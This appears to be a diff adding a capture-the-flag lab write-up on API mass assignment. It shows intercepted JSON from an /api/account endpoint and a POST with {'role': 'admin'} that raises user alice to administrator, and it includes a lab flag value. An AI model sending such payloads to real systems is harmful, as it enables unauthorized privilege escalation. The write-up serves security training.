@@ -15,3 +15,34 @@
 
 flag: 78b8ae7f-3fc0-4065-8249-9789a86ff6fa
 ```
+
+# SCHOGGI: API Mass Assignment
+
+- watched Request and Response of the profile page of alice via Burp Proxy
+- noticed the GET Request on `/api/account` which the server responded with a JSON
+
+```json
+{
+  "address": "Boulder Avenue 11",
+  "credit_card": "2034 8857 0007 8024",
+  "phone": "+41 760 603 132",
+  "picture": "user101.png",
+  "role": "user",
+  "uid": 101,
+  "username": "alice"
+}
+```
+
+- noticed by changing the address via the form on the profile page that a POST Request with a JSON is sent again to `/api/account`
+
+```json
+{ "address": "Boulder Avenue 10" }
+```
+
+- based on the given information tried to use the Burp Repeater to send a POST Request with a custom JSON where role is set to `admin`
+
+```json
+{ "role": "admin" }
+```
+
+- after the attack the role of `alice` was changed to `admin`
